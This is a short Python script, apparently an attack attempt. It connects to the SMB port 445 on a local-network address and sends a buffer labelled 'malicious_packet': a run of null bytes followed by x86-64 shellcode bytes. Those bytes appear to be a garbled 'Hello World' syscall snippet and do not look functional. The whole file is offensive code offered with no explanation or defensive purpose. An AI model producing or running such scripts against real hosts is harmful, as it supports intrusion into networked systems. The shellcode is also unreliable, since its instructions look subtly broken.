import socket
target_ip = '192.168.1.100'  
target_port = 445  

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((target_ip, target_port))

malicious_packet = b'\x00' * 1024+b'\x48\x31\xc0\x48\x31\xff\xb0\x04\x40\xb7\x01\x48\xbe\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x48\x89\xe6\x48\xc1\xe6\x08\x48\xc7\xc2\x0d\x00\x00\x00\x0f\x05'  

sock.send(malicious_packet)
sock.close()